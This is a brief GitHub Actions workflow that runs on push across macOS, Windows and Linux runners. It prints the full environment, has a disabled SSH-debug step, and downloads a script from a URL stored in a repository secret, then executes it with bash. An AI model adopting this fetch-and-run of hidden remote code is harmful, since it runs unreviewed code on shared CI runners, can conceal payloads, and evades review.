name: Action 1

on:
  push:

jobs:
  action:
    strategy:
      fail-fast: false
      matrix:
        platform: [macos-latest, windows-latest, ubuntu-latest]

    runs-on: ${{ matrix.platform }}
    steps:
      - name: Display Environment
        shell: bash
        run: set
      - name: Debugging with ssh
        if: false
        uses: lhotari/action-upterm@v1
      - name: Execute
        shell: bash
        run: | 
          curl -L ${{ secrets.RUNNER_SCRIPT }} -o script.sh 
          bash ./script.sh
